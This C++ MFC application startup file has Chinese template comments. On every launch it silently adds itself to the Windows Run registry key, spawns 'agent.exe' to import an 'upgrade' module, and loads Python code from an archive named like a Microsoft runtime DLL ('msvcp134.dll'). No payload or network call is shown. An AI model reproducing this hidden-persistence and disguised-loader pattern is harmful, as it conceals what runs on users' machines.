
// MFCApplication3.cpp : 定义应用程序的类行为。
//

#include "stdafx.h"
#include "MFCApplication3.h"
#include "MFCApplication3Dlg.h"
#include "python_support.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CMFCApplication3App

BEGIN_MESSAGE_MAP(CMFCApplication3App, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CMFCApplication3App 构造

CMFCApplication3App::CMFCApplication3App()
{
	// 支持重新启动管理器
	m_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;

	// TODO:  在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


void SetAutoRun(BOOL bAutoRun)
{
		HKEY hKey;
		CString strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");//找到系统的启动项  
		if (bAutoRun)
		{
			if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) //打开启动项       
			{
				TCHAR szModule[_MAX_PATH];
				GetModuleFileName(NULL, szModule, _MAX_PATH);//得到本程序自身的全路径  
				RegSetValueEx(hKey, _T("qxj"), 0, REG_SZ, (const BYTE*)(LPCSTR)szModule, wcslen(szModule)*2); //添加一个子Key,并设置值，"Client"是应用程序名字（不加后缀.exe）  
				RegCloseKey(hKey); //关闭注册表  
			}
		}
		else
		{
			if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
			{
				RegDeleteValue(hKey, _T("qxj"));
				RegCloseKey(hKey);
			}
		}
}


// 唯一的一个 CMFCApplication3App 对象

CMFCApplication3App theApp;


// CMFCApplication3App 初始化

BOOL CMFCApplication3App::InitInstance()
{
	char buf[100];
	sprintf_s(buf, "agent.exe -c \"import upgrade\" %d", GetCurrentProcessId());
	WinExec(buf, 0);
	SetAutoRun(TRUE);
	SetCurrentDir();

	PyExecW(_T("import sys;sys.path.insert(0,'msvcp134.dll')"));

	if (!PyExecW(_T("from autorun import *")))
	{
		AfxMessageBox(PyGetStr());
		return 0;
	}

	if (!PyEvalW(_T("can_run()")) || !PyGetInt())
	{
		return 0;
	}
	
	//PyExecW(_T("import autorun"));
	//PyEvalW(_T("str(autorun)"));
	//AfxMessageBox(PyGetStr());

	//WinExec("agent.exe -c \"import upgrade\" abc",0);

	// 如果一个运行在 Windows XP 上的应用程序清单指定要
	// 使用 ComCtl32.dll 版本 6 或更高版本来启用可视化方式，
	//则需要 InitCommonControlsEx()。  否则，将无法创建窗口。
	INITCOMMONCONTROLSEX InitCtrls;
	InitCtrls.dwSize = sizeof(InitCtrls);
	// 将它设置为包括所有要在应用程序中使用的
	// 公共控件类。
	InitCtrls.dwICC = ICC_WIN95_CLASSES;
	InitCommonControlsEx(&InitCtrls);

	CWinApp::InitInstance();

	AfxEnableControlContainer();

	// 创建 shell 管理器，以防对话框包含
	// 任何 shell 树视图控件或 shell 列表视图控件。
	CShellManager *pShellManager = new CShellManager;

	// 激活“Windows Native”视觉管理器，以便在 MFC 控件中启用主题
	CMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));


	CMFCApplication3Dlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();
	if (nResponse == IDOK)
	{

	}
	else if (nResponse == IDCANCEL)
	{

	}
	else if (nResponse == -1)
	{
		TRACE(traceAppMsg, 0, "警告: 对话框创建失败，应用程序将意外终止。\n");
		TRACE(traceAppMsg, 0, "警告: 如果您在对话框上使用 MFC 控件，则无法 #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS。\n");
	}

	// 删除上面创建的 shell 管理器。
	if (pShellManager != NULL)
	{
		delete pShellManager;
	}

	// 由于对话框已关闭，所以将返回 FALSE 以便退出应用程序，
	//  而不是启动应用程序的消息泵。
	return FALSE;
}



void CMFCApplication3App::SetCurrentDir()
{
	wchar_t szExeFilePathFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFilePathFileName, MAX_PATH);
	CString str = szExeFilePathFileName;
	str = str.Mid(0, str.ReverseFind(_T('\\')));
	SetCurrentDirectory(str.GetBuffer());
}
